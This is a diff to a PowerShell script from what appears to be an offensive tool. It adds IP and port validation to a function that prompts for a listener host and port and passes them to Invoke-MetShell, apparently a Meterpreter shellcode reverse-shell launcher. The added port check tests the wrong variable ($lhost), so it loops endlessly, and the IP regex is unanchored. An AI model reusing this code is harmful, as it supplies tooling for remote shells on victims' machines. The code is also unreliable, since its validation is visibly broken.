@@ -80,7 +80,18 @@ function Handle-AVStatus
 function Handle-Shellcode {
    Write-host "" 
    $lhost = Read-Host -Prompt '(Invoke-Shellcode) lhost'
+   $IPregex=‘(?<Address>((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))’
+   while ($lhost -NotMatch $IPregex) 
+   {
+        $lhost = Read-Host -Prompt '(Invoke-Shellcode) lhost'
+   }
+
    $lport = Read-Host -Prompt '(Invoke-Shellcode) lport'
+   while ($lhost -NotIn 1..65535) 
+   {
+        $lport = Read-Host -Prompt '(Invoke-Shellcode) lport'
+   }
+   
    Invoke-MetShell -lhost $lhost -lport $lport 
 }
 
